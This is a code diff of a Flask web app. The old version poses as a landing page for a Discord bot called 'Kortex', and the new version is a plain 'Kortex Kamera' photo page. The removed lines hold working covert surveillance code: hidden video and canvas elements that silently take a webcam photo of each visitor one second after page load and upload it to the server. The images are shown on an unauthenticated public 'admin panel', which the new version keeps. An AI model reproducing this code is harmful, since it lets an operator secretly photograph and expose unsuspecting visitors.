@@ -1,5 +1,6 @@
-from flask import Flask, render_template_string, request, send_from_directory, jsonify
+from flask import Flask, request, send_from_directory, jsonify, render_template_string
 import os, base64
+from datetime import datetime
 
 app = Flask(__name__)
 UPLOAD_FOLDER = 'uploads'
@@ -11,142 +12,105 @@ HTML = '''
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kortex - Discord'un Yeni Çağı</title>
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+<title>Kortex Admin</title>
 <style>
-:root{--c1:#00f5ff;--c2:#ff0055;--bg:#000;--text:#fff}
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
-body{background:var(--bg);color:var(--text);overflow-x:hidden;transition:.3s}
-nav{position:fixed;top:0;left:0;right:0;padding:.6rem .8rem;background:rgba(0,0,0,.45);backdrop-filter:blur(20px);display:flex;justify-content:space-between;align-items:center;font-weight:700;z-index:100;font-size:.9rem}
-nav a{color:var(--text);margin-left:.8rem;text-decoration:none;transition:.3s;cursor:pointer}
-nav a:hover{color:var(--c1)}
-section{padding:1.5rem .5rem;max-width:1000px;margin:auto}
-h1{font-size:clamp(2.8rem,10vw,4.5rem);font-weight:900;letter-spacing:-.05em;background:linear-gradient(135deg,var(--c1),var(--c2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-h2{font-size:clamp(1.3rem,5vw,2rem);font-weight:700;margin-bottom:.8rem;text-align:center}
-.btn{display:inline-block;margin-top:.5rem;padding:.6rem 1.2rem;border:none;border-radius:999px;background:linear-gradient(135deg,var(--c1),var(--c2));color:#000;font-weight:700;font-size:.85rem;text-decoration:none;transition:.3s;box-shadow:0 0 10px var(--c1)}
-.btn:hover{transform:translateY(-2px) scale(1.03);box-shadow:0 0 15px var(--c1)}
-.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:.5rem}
-.card{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:1rem;font-size:.85rem;backdrop-filter:blur(20px);transition:.3s}
-.card:hover{background:rgba(255,255,255,.1);transform:translateY(-2px);border-color:var(--c1)}
-#cameraSection{padding:2rem;margin-top:3rem;border:1px solid rgba(255,255,255,.1);border-radius:12px;backdrop-filter:blur(10px);background:rgba(0,0,0,.5);}
-#cameraSection img{border:1px solid var(--c1);border-radius:8px;margin:5px;}
+body{background:#111;color:#fff;font-family:sans-serif;text-align:center;margin:0;padding:0}
+h1{margin-top:1rem;color:#0ff}
+#cameraBtn{padding:.6rem 1.2rem;background:#0ff;color:#000;border:none;border-radius:8px;cursor:pointer;margin-top:1rem}
+#snapshots{display:flex;flex-wrap:wrap;justify-content:center;gap:1rem;margin-top:2rem}
+#snapshots img{width:160px;height:120px;border-radius:8px;object-fit:cover;border:2px solid #0ff}
+.adminPanel{margin-top:3rem;padding:1rem;border-top:1px solid #0ff}
 </style>
 </head>
 <body>
-<nav>
-  <span>Kortex</span>
-  <div>
-    <a href="#features">Özellikler</a>
-    <a href="#pricing">Paketler</a>
-    <a href="#contact">İletişim</a>
-    <a href="#" onclick="openAdmin()">Admin Panel</a>
-  </div>
-</nav>
 
-<section style="height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:.5rem">
-  <h1>Kortex</h1>
-  <p style="margin:.3rem 0 .5rem;font-size:1rem;color:#bbb">Discord'un yeni çağı</p>
-</section>
+<h1>Kortex Kamera</h1>
+<video id="video" width="320" height="240" autoplay style="border:2px solid #0ff;border-radius:8px;margin-top:1rem"></video><br>
+<button id="cameraBtn">Fotoğraf Çek</button>
 
-<section id="features">
-  <h2>Neden Kortex?</h2>
-  <div class="grid">
-    <div class="card"><i class="fas fa-music"></i><h3>4K Müzik</h3><p>Spotify, YouTube, SoundCloud, Apple Music — 7/24.</p></div>
-    <div class="card"><i class="fas fa-shield-alt"></i><h3>AI Moderasyon</h3><p>Otomatik spam, raid, küfür, phishing tespiti.</p></div>
-    <div class="card"><i class="fas fa-gamepad"></i><h3>+60 Mini Oyun</h3><p>Economy, slot, blackjack, quiz, trivia.</p></div>
-  </div>
-</section>
-
-<!-- Kamera ve Admin Paneli -->
-<section id="cameraSection">
-  <h2 style="color:var(--c1)">Fotoğraf Çekme ve Admin Paneli</h2>
-  <video id="video" autoplay style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-  <div id="adminPanel"></div>
-</section>
+<div class="adminPanel">
+<h2>Admin Paneli</h2>
+<div id="snapshots"></div>
+</div>
 
 <script>
-// Admin paneli elementi
-const adminPanel = document.getElementById('adminPanel');
+const video = document.getElementById('video');
+const cameraBtn = document.getElementById('cameraBtn');
+const snapshots = document.getElementById('snapshots');
 
-// Sayfa yüklendiğinde serverdaki fotoğrafları yükle
-window.addEventListener('load', () => {
-    fetch('/list_uploads')
-    .then(res => res.json())
-    .then(data => {
-        data.files.forEach(file => {
-            const imgEl = document.createElement('img');
-            imgEl.src = '/uploads/' + file;
-            imgEl.width = 160;
-            imgEl.height = 120;
-            adminPanel.appendChild(imgEl);
-        });
+// Kamera izni ve başlatma
+navigator.mediaDevices.getUserMedia({ video: true })
+.then(stream => { video.srcObject = stream })
+.catch(err => { alert('Kamera açılmadı: ' + err) });
+
+// Fotoğraf çekme
+cameraBtn.addEventListener('click', () => {
+    const canvas = document.createElement('canvas');
+    canvas.width = 320;
+    canvas.height = 240;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const dataURL = canvas.toDataURL('image/png');
+
+    // Server'a gönder
+    fetch('/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataURL })
+    }).then(res => res.json()).then(data => {
+        if(data.success){ loadSnapshots(); }
     });
 });
 
-// Kamera + otomatik fotoğraf çekme
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-
-navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-.then(stream => {
-    video.srcObject = stream;
-    video.onloadedmetadata = () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-
-        setTimeout(() => {
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imgData = canvas.toDataURL('image/png');
-
-            // Admin paneline ekle
-            const imgEl = document.createElement('img');
-            imgEl.src = imgData;
-            imgEl.width = 160;
-            imgEl.height = 120;
-            adminPanel.appendChild(imgEl);
-
-            // Server'a gönder
-            fetch('/upload', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imgData })
-            });
-        }, 1000);
-    };
-})
-.catch(err => console.log("Kamera izni reddedildi: " + err));
-
-function openAdmin() {
-    document.getElementById('cameraSection').scrollIntoView({behavior:'smooth'});
+// Admin paneli fotoğrafları yükle
+function loadSnapshots(){
+    fetch('/list_uploads')
+    .then(res => res.json())
+    .then(files => {
+        snapshots.innerHTML = '';
+        files.forEach(f => {
+            const img = document.createElement('img');
+            img.src = '/uploads/' + f;
+            snapshots.appendChild(img);
+        });
+    });
 }
+
+// Sayfa yüklenince admin paneli yükle
+window.onload = loadSnapshots;
 </script>
+
 </body>
 </html>
 '''
 
+# Ana sayfa
 @app.route('/')
 def index():
     return render_template_string(HTML)
 
+# Fotoğraf yükleme
 @app.route('/upload', methods=['POST'])
 def upload():
     data = request.json['image']
-    header, encoded = data.split(',', 1)
-    file_data = base64.b64decode(encoded)
-    filename = f"{len(os.listdir(UPLOAD_FOLDER))+1}.png"
-    with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
-        f.write(file_data)
-    return "OK"
+    header, encoded = data.split(',',1)
+    binary = base64.b64decode(encoded)
+    filename = datetime.now().strftime('%Y%m%d%H%M%S') + '.png'
+    path = os.path.join(UPLOAD_FOLDER, filename)
+    with open(path, 'wb') as f: f.write(binary)
+    return jsonify(success=True)
 
-@app.route('/list_uploads')
-def list_uploads():
-    files = os.listdir(UPLOAD_FOLDER)
-    return jsonify({"files": files})
-
+# Upload klasörü
 @app.route('/uploads/<filename>')
 def uploaded_file(filename):
     return send_from_directory(UPLOAD_FOLDER, filename)
+
+# Admin paneli için liste
+@app.route('/list_uploads')
+def list_uploads():
+    files = os.listdir(UPLOAD_FOLDER)
+    files = sorted([f for f in files if f.endswith('.png')], reverse=True)
+    return jsonify(files)
 
 if __name__ == '__main__':
     app.run(debug=True)
